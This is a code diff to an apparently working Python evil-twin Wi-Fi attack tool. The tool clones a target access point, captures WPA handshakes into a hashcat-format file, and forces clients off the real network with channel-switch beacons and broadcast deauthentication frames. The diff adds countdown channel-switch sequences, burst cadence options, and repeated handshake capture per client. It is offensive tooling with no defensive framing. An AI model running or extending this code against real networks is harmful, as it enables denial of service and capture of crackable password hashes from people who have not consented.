@@ -144,13 +144,13 @@ class ApResponder:
         print(f"[#] M1    -> {_mac_str(client)} (ANonce {anonce[:4].hex()}...)")
 
     def _on_eapol(self, pkt, client: bytes) -> None:
-        if getattr(pkt, "msg_num", 0) != 2 or client in self.captured:
+        if getattr(pkt, "msg_num", 0) != 2:
             return
         anonce = self.anonce.get(client)
         if anonce is None:                            # M2 for an assoc we didn't answer
             return
         self.stats["m2"] += 1
-        print(f"[#] M2    <- {_mac_str(client)} (SNonce {(pkt.nonce or b'')[:4].hex()}...)")
+        print(f"[#] M2    <- {_mac_str(client)} #{self.stats['m2']} (SNonce {(pkt.nonce or b'')[:4].hex()}...)")
         hs = self._assemble(client, anonce, pkt)
         lines = eapol_hashlines(self.ssid, hs)
         if not lines:
@@ -185,16 +185,29 @@ async def _beacon_loop(iface, twin: bytes) -> None:
         await asyncio.sleep(_BEACON_PERIOD_S)
 
 
-async def _punt_loop(iface, target_channel: int, frames: list[bytes]) -> None:
+async def _punt_loop(iface, target_channel: int, csa_frames: list[bytes], deauth_frame,
+                     csa_count: int, cadence: str, period: float) -> None:
     if iface.current_channel != target_channel:
         await iface.set_channel(target_channel)
-    print(f"[*] punting on ch {target_channel}: {len(frames)} frame type(s) in bursts")
+    print(f"[*] punting on ch {target_channel}: csa={bool(csa_frames)} "
+          f"deauth={deauth_frame is not None} csa_count={csa_count} cadence={cadence}")
     while True:
-        for _ in range(_CSA_BURST):
-            for frame in frames:
+        if csa_frames and csa_count > 0:
+            for frame in csa_frames:                      # count N..0, one per beacon interval
                 await iface.send_no_wait(frame)
-            await asyncio.sleep(_CSA_INTRA_S)
-        await asyncio.sleep(_CSA_INTER_S)
+                await asyncio.sleep(_BEACON_PERIOD_S)
+        elif csa_frames:
+            for _ in range(_CSA_BURST):
+                await iface.send_no_wait(csa_frames[0])
+                await asyncio.sleep(_CSA_INTRA_S)
+        if deauth_frame is not None:
+            for _ in range(_CSA_BURST):
+                await iface.send_no_wait(deauth_frame)
+                await asyncio.sleep(_CSA_INTRA_S)
+        if cadence == "once":
+            print("[*] punt: one cycle sent, now idle")
+            return
+        await asyncio.sleep(period if cadence == "periodic" else _CSA_INTER_S)
 
 
 def _pick(ifaces, substr: str):
@@ -268,13 +281,18 @@ async def main(a) -> None:
     print(f"[*] writing captures to {a.out}. Ctrl-C to stop.\n")
 
     tasks = [asyncio.create_task(_beacon_loop(apcard, twin))]
-    if txcard is not None:
-        punt_frames = []
+    if a.punt != "none" and txcard is None:
+        print("[-] --punt needs a --txcard; continuing beacon-only (no punt)")
+    elif a.punt != "none":
+        base = real if real is not None else twin
+        csa_frames = []
         if a.punt in ("csa", "both"):
-            punt_frames.append(build_csa_beacon(real if real is not None else twin, a.channel))
-        if a.punt in ("deauth", "both"):
-            punt_frames.append(build_deauth(_BCAST, bssid, bssid, 7))   # real AP -> broadcast
-        tasks.append(asyncio.create_task(_punt_loop(txcard, a.target_channel, punt_frames)))
+            counts = range(a.csa_count, -1, -1) if a.csa_count > 0 else [0]
+            csa_frames = [build_csa_beacon(base, a.channel, count=c) for c in counts]
+        deauth_frame = build_deauth(_BCAST, bssid, bssid, 7) if a.punt in ("deauth", "both") else None
+        tasks.append(asyncio.create_task(_punt_loop(
+            txcard, a.target_channel, csa_frames, deauth_frame, a.csa_count,
+            a.punt_cadence, a.punt_period)))
 
     try:
         await asyncio.gather(*tasks)
@@ -320,8 +338,14 @@ if __name__ == "__main__":
     p.add_argument("--ssid", default="", help="override SSID (default: read from the cloned beacon)")
     p.add_argument("--channel", type=int, default=1, help="decoy channel for the twin")
     p.add_argument("--target-channel", type=int, default=11, help="the target AP's real channel")
-    p.add_argument("--punt", choices=("csa", "deauth", "both"), default="csa",
-                   help="how to punt clients off the real AP on the target channel")
+    p.add_argument("--punt", choices=("none", "csa", "deauth", "both"), default="csa",
+                   help="what to send on the target channel to punt clients (none = beacon-only)")
+    p.add_argument("--punt-cadence", choices=("continuous", "once", "periodic"), default="periodic",
+                   help="continuous stream, a single burst, or a burst every --punt-period s")
+    p.add_argument("--punt-period", type=float, default=30.0,
+                   help="seconds between bursts for --punt-cadence periodic")
+    p.add_argument("--csa-count", type=int, default=0,
+                   help="CSA switch-count countdown: 0 = spray count=0; N = send N..0 one per beacon, then switch")
     p.add_argument("--capture-timeout", type=float, default=10.0)
     p.add_argument("--out", default=str(Path(tempfile.gettempdir()) / "eviltwin.hc22000"))
     p.add_argument("--debug", action="store_true")
